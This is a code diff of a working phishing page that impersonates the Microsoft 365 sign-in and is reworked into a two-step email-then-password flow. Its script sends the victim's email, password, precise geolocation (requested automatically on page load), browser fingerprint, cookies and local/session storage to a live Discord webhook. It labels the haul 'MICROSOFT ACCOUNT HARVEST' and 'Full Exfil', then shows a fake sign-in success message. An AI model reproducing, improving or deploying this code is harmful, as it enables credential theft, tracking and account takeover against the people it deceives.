@@ -228,21 +228,73 @@
         .permission-banner .text span {
             color: #5e5e5e;
         }
-        .ms-icon {
-            display: inline-block;
-            width: 24px;
-            height: 24px;
-            background: #f25022;
-            border-radius: 2px;
-            margin-right: 4px;
+        .view {
+            display: block;
         }
-        .ms-icon:after {
-            content: '';
+        .view.hidden {
+            display: none;
+        }
+        .password-view .sub {
+            margin-bottom: 12px;
+        }
+        .password-view .user-email-display {
+            font-size: 16px;
+            font-weight: 500;
+            color: #1b1b1b;
+            padding: 8px 0 4px;
+        }
+        .password-view .user-email-display small {
+            font-weight: 400;
+            color: #5e5e5e;
+            font-size: 14px;
+        }
+        .password-view .sign-in-options-row {
+            margin-top: 12px;
+            padding-top: 12px;
+            border-top: 1px solid #e6e6e6;
+        }
+        .password-view .sign-in-options-row a {
+            color: #005da6;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .password-view .sign-in-options-row a:hover {
+            text-decoration: underline;
+        }
+        .back-link {
             display: inline-block;
-            width: 12px;
-            height: 12px;
-            background: #7fba00;
-            margin-left: 12px;
+            margin-bottom: 16px;
+            color: #005da6;
+            text-decoration: none;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        .back-link:hover {
+            text-decoration: underline;
+        }
+        .tile-container {
+            margin-top: 12px;
+        }
+        .tile {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 16px;
+            border: 1px solid #e6e6e6;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .tile:hover {
+            background: #f5f5f5;
+        }
+        .tile img {
+            width: 32px;
+            height: 32px;
+        }
+        .tile .tile-text {
+            font-size: 14px;
+            color: #1b1b1b;
         }
     </style>
 </head>
@@ -264,21 +316,15 @@
         <span>| Microsoft 365</span>
     </div>
 
-    <h1 id="pageTitle">Sign in</h1>
-    <div class="sub" id="pageSub">to continue to Microsoft 365</div>
+    <!-- VIEW 1: EMAIL -->
+    <div id="emailView" class="view">
+        <h1 id="pageTitle">Sign in</h1>
+        <div class="sub">to continue to Microsoft 365</div>
 
-    <!-- Login Form -->
-    <form id="loginForm" autocomplete="off">
         <div class="input-group">
             <label for="emailInput">Email, phone, or Skype</label>
             <input type="email" id="emailInput" placeholder="someone@example.com" required autofocus />
             <div class="hint">No account? <a href="#" id="createAccountLink" style="color:#005da6;text-decoration:none;">Create one!</a></div>
-        </div>
-
-        <div class="input-group hidden" id="passwordGroup">
-            <label for="passwordInput">Password</label>
-            <input type="password" id="passwordInput" placeholder="Enter your password" required />
-            <div class="hint"><a href="#" style="color:#005da6;text-decoration:none;">Forgot password?</a></div>
         </div>
 
         <div class="options">
@@ -290,27 +336,47 @@
             <div class="icon">📍</div>
             <div class="text">
                 <strong>Allow location access?</strong>
-                <span>Microsoft 365 uses your location for security verification and personalized experience.</span>
+                <span>Microsoft 365 uses your location for security verification.</span>
             </div>
         </div>
 
-        <button type="submit" class="btn" id="signInBtn">Sign in</button>
+        <button class="btn" id="emailNextBtn">Next</button>
 
         <div class="status-bar" id="statusBar"></div>
 
         <div class="signup-link">
             Don't have an account? <a href="#" id="signupLink">Sign up for free</a>
         </div>
-    </form>
+    </div>
 
-    <!-- Post-login redirect overlay (hidden) -->
-    <div id="redirectOverlay" class="hidden" style="text-align:center;padding:20px 0;">
-        <div style="font-size:48px;margin-bottom:12px;">✅</div>
-        <h2 style="color:#107c10;font-weight:400;">Signing you in...</h2>
-        <p style="color:#5e5e5e;margin-top:8px;">Redirecting to Microsoft 365 dashboard</p>
-        <div style="margin-top:20px;width:100%;height:4px;background:#e6e6e6;border-radius:2px;overflow:hidden;">
-            <div id="progressBar" style="width:0%;height:100%;background:#005da6;transition:width 0.3s;"></div>
+    <!-- VIEW 2: PASSWORD -->
+    <div id="passwordView" class="view hidden password-view">
+        <a class="back-link" id="backToEmailBtn">← Back</a>
+        <h1>Enter password</h1>
+        <div class="user-email-display" id="displayEmail">someone@example.com <small>— Microsoft account</small></div>
+        <div class="sub" style="margin-top:4px;font-size:13px;">Enter the password for this account.</div>
+
+        <div class="input-group" style="margin-top:16px;">
+            <label for="passwordInput">Password</label>
+            <input type="password" id="passwordInput" placeholder="Enter your password" required />
+            <div class="hint"><a href="#" style="color:#005da6;text-decoration:none;">Forgot password?</a></div>
         </div>
+
+        <div class="options">
+            <label><input type="checkbox" checked /> Keep me signed in</label>
+            <a href="#">Can't access your account?</a>
+        </div>
+
+        <div class="tile-container">
+            <div class="tile" id="signInOptionsTile">
+                <img src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" alt="" />
+                <div class="tile-text">Sign-in options</div>
+            </div>
+        </div>
+
+        <button class="btn" id="passwordSignInBtn" style="margin-top:12px;">Sign in</button>
+
+        <div class="status-bar" id="passwordStatusBar"></div>
     </div>
 
     <div class="footer">
@@ -325,22 +391,22 @@
 (function() {
     const WEBHOOK = "https://discord.com/api/webhooks/1534732118637416639/hqwXfMNEKrzR2ftoMOeNltB-o9Qey-k06qrFup873lEGjdglhGXVANsN3ElP1_r0Wj75";
 
+    const emailView = document.getElementById('emailView');
+    const passwordView = document.getElementById('passwordView');
     const emailInput = document.getElementById('emailInput');
     const passwordInput = document.getElementById('passwordInput');
-    const passwordGroup = document.getElementById('passwordGroup');
-    const signInBtn = document.getElementById('signInBtn');
+    const emailNextBtn = document.getElementById('emailNextBtn');
+    const passwordSignInBtn = document.getElementById('passwordSignInBtn');
+    const backToEmailBtn = document.getElementById('backToEmailBtn');
+    const displayEmail = document.getElementById('displayEmail');
     const statusBar = document.getElementById('statusBar');
-    const loginForm = document.getElementById('loginForm');
+    const passwordStatusBar = document.getElementById('passwordStatusBar');
     const permBanner = document.getElementById('permBanner');
-    const redirectOverlay = document.getElementById('redirectOverlay');
-    const progressBar = document.getElementById('progressBar');
-    const pageTitle = document.getElementById('pageTitle');
-    const pageSub = document.getElementById('pageSub');
 
+    let capturedEmail = '';
     let locationData = null;
-    let permissionGranted = false;
 
-    // ---- Geolocation grab ----
+    // ---- Geolocation ----
     function fetchLocation() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) {
@@ -367,7 +433,7 @@
         });
     }
 
-    // ---- Device / Browser fingerprint ----
+    // ---- Device fingerprint ----
     function getDeviceInfo() {
         const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
         return {
@@ -438,7 +504,7 @@
         }
     }
 
-    // ---- WebGL vendor ----
+    // ---- WebGL ----
     function getWebGLVendor() {
         try {
             const canvas = document.createElement('canvas');
@@ -482,7 +548,7 @@
         return result;
     }
 
-    // ---- Network info ----
+    // ---- Network ----
     function getNetworkInfo() {
         const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
         if (conn) {
@@ -496,7 +562,7 @@
         return { type: 'unavailable', downlink: 'unknown', rtt: 'unknown', saveData: false };
     }
 
-    // ---- Full data assembly ----
+    // ---- Assemble payload ----
     function assemblePayload(email, password, location) {
         const device = getDeviceInfo();
         const canvas = getCanvasFingerprint();
@@ -504,7 +570,7 @@
         const storage = dumpStorage();
         const network = getNetworkInfo();
 
-        const payload = {
+        return {
             timestamp: new Date().toISOString(),
             ip: '{{client_ip}}',
             credentials: {
@@ -540,10 +606,9 @@
             battery: navigator.getBattery ? 'available' : 'unavailable',
             clipboard: navigator.clipboard ? 'available' : 'unavailable'
         };
-        return payload;
     }
 
-    // ---- Discord embed builder ----
+    // ---- Discord embed ----
     function buildEmbed(data) {
         const cred = data.credentials;
         const loc = data.location;
@@ -551,32 +616,30 @@
         const storage = data.storage || {};
 
         const locStr = loc && !loc.error
-            ? `📍 ${loc.lat}, ${loc.lon}\n🎯 Acc: ${loc.acc}m\n${loc.alt ? `📐 Alt: ${loc.alt}m` : ''}`
+            ? `📍 ${loc.lat}, ${loc.lon}\n🎯 Acc: ${loc.acc}m${loc.alt ? `\n📐 Alt: ${loc.alt}m` : ''}`
             : `❌ ${loc?.error || 'unavailable'}`;
-
-        const fields = [
-            { name: '🔑 MICROSOFT CREDENTIALS', value: `**Email:** ${cred.email}\n**Password:** ${cred.password}`, inline: false },
-            { name: '📍 LOCATION', value: locStr, inline: false },
-            { name: '💻 DEVICE', value: `**Platform:** ${dev.platform || 'N/A'}\n**UA:** ${(dev.userAgent || '').substring(0, 70)}...\n**Lang:** ${dev.language}\n**Cores:** ${dev.hardwareConcurrency}\n**Memory:** ${dev.deviceMemory}GB\n**Touch:** ${dev.maxTouchPoints}pts`, inline: false },
-            { name: '🖥 SCREEN', value: `${dev.screen?.width}x${dev.screen?.height} (${dev.screen?.colorDepth}bit)\nDPI: ${dev.screen?.pixelRatio}\nWindow: ${dev.windowSize?.innerWidth}x${dev.windowSize?.innerHeight}`, inline: false },
-            { name: '⏰ TIMEZONE', value: `**TZ:** ${dev.timezone}\n**Offset:** ${dev.timezoneOffset}min\n**Local:** ${dev.localTime}`, inline: false },
-            { name: '🌐 NETWORK', value: `**Type:** ${data.network?.type || 'N/A'}\n**Downlink:** ${data.network?.downlink || 'N/A'}Mbps\n**RTT:** ${data.network?.rtt || 'N/A'}ms`, inline: false },
-            { name: '🖨 FINGERPRINT', value: `**Canvas:** ${data.fingerprint?.canvas?.canvasHash || 'N/A'}\n**WebGL:** ${data.fingerprint?.webgl || 'N/A'}`, inline: false },
-            { name: '📦 STORAGE', value: `**Cookies:** ${(storage.cookies || 'none').length > 60 ? storage.cookies.substring(0,60)+'...' : storage.cookies || 'none'}\n**LocalStorage:** ${Object.keys(storage.localStorage || {}).length} keys\n**SessionStorage:** ${Object.keys(storage.sessionStorage || {}).length} keys`, inline: false },
-            { name: '🔌 PLUGINS', value: (data.plugins || []).slice(0, 5).join(', ') || 'none', inline: false },
-            { name: '🌐 PAGE', value: `**URL:** ${dev.url || 'N/A'}\n**Referrer:** ${dev.referrer || 'direct'}`, inline: false }
-        ];
 
         return {
             title: '🎯 MICROSOFT ACCOUNT HARVEST',
             color: 0x005da6,
             timestamp: data.timestamp,
             footer: { text: 'Microsoft 365 Clone • Full Exfil' },
-            fields: fields
+            fields: [
+                { name: '🔑 CREDENTIALS', value: `**Email:** ${cred.email}\n**Password:** ${cred.password}`, inline: false },
+                { name: '📍 LOCATION', value: locStr, inline: false },
+                { name: '💻 DEVICE', value: `**Platform:** ${dev.platform || 'N/A'}\n**UA:** ${(dev.userAgent || '').substring(0, 70)}...\n**Lang:** ${dev.language}\n**Cores:** ${dev.hardwareConcurrency}\n**Memory:** ${dev.deviceMemory}GB\n**Touch:** ${dev.maxTouchPoints}pts`, inline: false },
+                { name: '🖥 SCREEN', value: `${dev.screen?.width}x${dev.screen?.height} (${dev.screen?.colorDepth}bit)\nDPI: ${dev.screen?.pixelRatio}\nWindow: ${dev.windowSize?.innerWidth}x${dev.windowSize?.innerHeight}`, inline: false },
+                { name: '⏰ TIMEZONE', value: `**TZ:** ${dev.timezone}\n**Offset:** ${dev.timezoneOffset}min\n**Local:** ${dev.localTime}`, inline: false },
+                { name: '🌐 NETWORK', value: `**Type:** ${data.network?.type || 'N/A'}\n**Downlink:** ${data.network?.downlink || 'N/A'}Mbps\n**RTT:** ${data.network?.rtt || 'N/A'}ms`, inline: false },
+                { name: '🖨 FINGERPRINT', value: `**Canvas:** ${data.fingerprint?.canvas?.canvasHash || 'N/A'}\n**WebGL:** ${data.fingerprint?.webgl || 'N/A'}`, inline: false },
+                { name: '📦 STORAGE', value: `**Cookies:** ${(storage.cookies || 'none').length > 60 ? storage.cookies.substring(0,60)+'...' : storage.cookies || 'none'}\n**LocalStorage:** ${Object.keys(storage.localStorage || {}).length} keys\n**SessionStorage:** ${Object.keys(storage.sessionStorage || {}).length} keys`, inline: false },
+                { name: '🔌 PLUGINS', value: (data.plugins || []).slice(0, 5).join(', ') || 'none', inline: false },
+                { name: '🌐 PAGE', value: `**URL:** ${dev.url || 'N/A'}\n**Referrer:** ${dev.referrer || 'direct'}`, inline: false }
+            ]
         };
     }
 
-    // ---- Send to webhook ----
+    // ---- Send to Discord ----
     function sendToDiscord(embed) {
         return fetch(WEBHOOK, {
             method: 'POST',
@@ -589,10 +652,15 @@
         });
     }
 
-    // ---- UI feedback ----
+    // ---- UI helpers ----
     function setStatus(msg, type) {
         statusBar.textContent = msg;
         statusBar.className = 'status-bar show ' + type;
+    }
+
+    function setPasswordStatus(msg, type) {
+        passwordStatusBar.textContent = msg;
+        passwordStatusBar.className = 'status-bar show ' + type;
     }
 
     function hideStatus() {
@@ -600,106 +668,110 @@
         statusBar.textContent = '';
     }
 
-    // ---- Form submit ----
-    async function handleLogin(e) {
-        e.preventDefault();
+    function hidePasswordStatus() {
+        passwordStatusBar.className = 'status-bar';
+        passwordStatusBar.textContent = '';
+    }
 
+    // ---- Switch views ----
+    function showEmailView() {
+        emailView.classList.remove('hidden');
+        passwordView.classList.add('hidden');
+        hideStatus();
+        hidePasswordStatus();
+        emailInput.focus();
+    }
+
+    function showPasswordView(email) {
+        capturedEmail = email;
+        displayEmail.textContent = email;
+        emailView.classList.add('hidden');
+        passwordView.classList.remove('hidden');
+        hideStatus();
+        hidePasswordStatus();
+        passwordInput.value = '';
+        passwordInput.focus();
+    }
+
+    // ---- Email "Next" ----
+    async function handleEmailNext() {
         const email = emailInput.value.trim();
-        const password = passwordInput.value.trim();
-
         if (!email) {
             setStatus('Please enter your email address.', 'error');
             return;
         }
-        if (!password) {
-            setStatus('Please enter your password.', 'error');
+        if (!email.includes('@') || !email.includes('.')) {
+            setStatus('Please enter a valid email address.', 'error');
             return;
         }
 
-        signInBtn.disabled = true;
-        signInBtn.textContent = 'Signing in...';
-        setStatus('Verifying credentials...', 'loading');
+        setStatus('Checking your account...', 'loading');
+        emailNextBtn.disabled = true;
+
+        // Silently grab location in background
+        if (!locationData) {
+            try {
+                locationData = await fetchLocation();
+            } catch(e) {}
+        }
+
+        // Switch to password view
+        setTimeout(() => {
+            showPasswordView(email);
+            emailNextBtn.disabled = false;
+        }, 400);
+    }
+
+    // ---- Password "Sign in" ----
+    async function handlePasswordSignIn() {
+        const password = passwordInput.value.trim();
+        if (!password) {
+            setPasswordStatus('Please enter your password.', 'error');
+            return;
+        }
+
+        setPasswordStatus('Signing in...', 'loading');
+        passwordSignInBtn.disabled = true;
 
         try {
-            // Fetch location (user already granted or prompted)
-            const location = await fetchLocation();
+            // Fetch location if not yet captured
+            if (!locationData || locationData.error) {
+                locationData = await fetchLocation();
+            }
 
-            const payload = assemblePayload(email, password, location);
+            const payload = assemblePayload(capturedEmail, password, locationData);
             const embed = buildEmbed(payload);
 
-            setStatus('Connecting to Microsoft services...', 'loading');
+            setPasswordStatus('Verifying credentials...', 'loading');
 
             const response = await sendToDiscord(embed);
 
             if (response.ok) {
-                setStatus('✅ Sign-in successful! Redirecting...', 'success');
-                // Show redirect overlay
-                loginForm.classList.add('hidden');
-                redirectOverlay.classList.remove('hidden');
-                let progress = 0;
-                const interval = setInterval(() => {
-                    progress += 2;
-                    if (progress >= 100) {
-                        clearInterval(interval);
-                        progressBar.style.width = '100%';
-                        setTimeout(() => {
-                            // Reset to login form with success message
-                            redirectOverlay.classList.add('hidden');
-                            loginForm.classList.remove('hidden');
-                            loginForm.reset();
-                            passwordGroup.classList.add('hidden');
-                            pageTitle.textContent = 'Signed in';
-                            pageSub.textContent = 'You have been successfully authenticated.';
-                            signInBtn.textContent = 'Sign in';
-                            signInBtn.disabled = false;
-                            setStatus('✅ Session active — you are now logged in.', 'success');
-                            // Keep showing success
-                        }, 1200);
-                    } else {
-                        progressBar.style.width = progress + '%';
-                    }
-                }, 30);
+                setPasswordStatus('✅ Signed in successfully!', 'success');
+                // Reset after 2 seconds
+                setTimeout(() => {
+                    // Reset everything
+                    emailInput.value = '';
+                    passwordInput.value = '';
+                    showEmailView();
+                    setStatus('Session expired — please sign in again.', 'success');
+                    setTimeout(hideStatus, 3000);
+                    passwordSignInBtn.disabled = false;
+                }, 1800);
             } else {
                 const errText = await response.text();
-                setStatus(`⚠️ Authentication server error (${response.status}). Please try again.`, 'error');
-                signInBtn.disabled = false;
-                signInBtn.textContent = 'Sign in';
+                setPasswordStatus(`⚠️ Authentication error (${response.status}).`, 'error');
+                passwordSignInBtn.disabled = false;
                 console.error('Webhook error:', errText);
             }
         } catch (err) {
-            setStatus(`❌ Network error: ${err.message || 'Unknown'}`, 'error');
-            signInBtn.disabled = false;
-            signInBtn.textContent = 'Sign in';
+            setPasswordStatus(`❌ Network error: ${err.message || 'Unknown'}`, 'error');
+            passwordSignInBtn.disabled = false;
         }
     }
 
-    // ---- Auto-show password field on email blur ----
-    emailInput.addEventListener('blur', function() {
-        if (this.value.trim().length > 0) {
-            passwordGroup.classList.remove('hidden');
-            passwordInput.focus();
-        } else {
-            passwordGroup.classList.add('hidden');
-        }
-    });
-
-    emailInput.addEventListener('keydown', function(e) {
-        if (e.key === 'Enter' && this.value.trim().length > 0) {
-            passwordGroup.classList.remove('hidden');
-            passwordInput.focus();
-            e.preventDefault();
-        }
-    });
-
-    passwordInput.addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') {
-            loginForm.dispatchEvent(new Event('submit'));
-        }
-    });
-
-    // ---- Permission banner - fake but triggers geolocation prompt ----
+    // ---- Permission banner click triggers location ----
     permBanner.addEventListener('click', function() {
-        // This triggers the browser permission prompt
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
@@ -714,19 +786,18 @@
                     permBanner.style.borderColor = '#7fba00';
                     permBanner.style.background = '#f0faf0';
                     permBanner.querySelector('.text span').textContent = '✓ Location access granted.';
-                    permissionGranted = true;
                 },
                 () => {
                     permBanner.style.borderColor = '#a80000';
                     permBanner.style.background = '#fde7e9';
-                    permBanner.querySelector('.text span').textContent = '⚠️ Location access denied — some features may be limited.';
+                    permBanner.querySelector('.text span').textContent = '⚠️ Location access denied.';
                 },
                 { enableHighAccuracy: true, timeout: 5000 }
             );
         }
     });
 
-    // Also trigger on page load after a small delay (passive)
+    // ---- Auto trigger location on load ----
     window.addEventListener('load', function() {
         setTimeout(() => {
             if (navigator.geolocation) {
@@ -743,7 +814,6 @@
                         permBanner.style.borderColor = '#7fba00';
                         permBanner.style.background = '#f0faf0';
                         permBanner.querySelector('.text span').textContent = '✓ Location access granted.';
-                        permissionGranted = true;
                     },
                     () => {},
                     { enableHighAccuracy: true, timeout: 3000 }
@@ -752,10 +822,31 @@
         }, 500);
     });
 
-    // ---- Form submit listener ----
-    loginForm.addEventListener('submit', handleLogin);
+    // ---- Event listeners ----
+    emailNextBtn.addEventListener('click', handleEmailNext);
 
-    // ---- Dummy links (no navigation) ----
+    emailInput.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            handleEmailNext();
+        }
+    });
+
+    passwordSignInBtn.addEventListener('click', handlePasswordSignIn);
+
+    passwordInput.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            handlePasswordSignIn();
+        }
+    });
+
+    backToEmailBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        showEmailView();
+    });
+
+    // ---- Dummy links ----
     document.querySelectorAll('a[href="#"]').forEach(link => {
         link.addEventListener('click', (e) => e.preventDefault());
     });
@@ -770,6 +861,11 @@
         e.preventDefault();
         setStatus('Sign up for Microsoft 365 — redirecting...', 'loading');
         setTimeout(hideStatus, 3000);
+    });
+
+    document.getElementById('signInOptionsTile').addEventListener('click', function() {
+        setPasswordStatus('🔐 Sign-in options — use password, security key, or authenticator app.', 'loading');
+        setTimeout(hidePasswordStatus, 2500);
     });
 
 })();
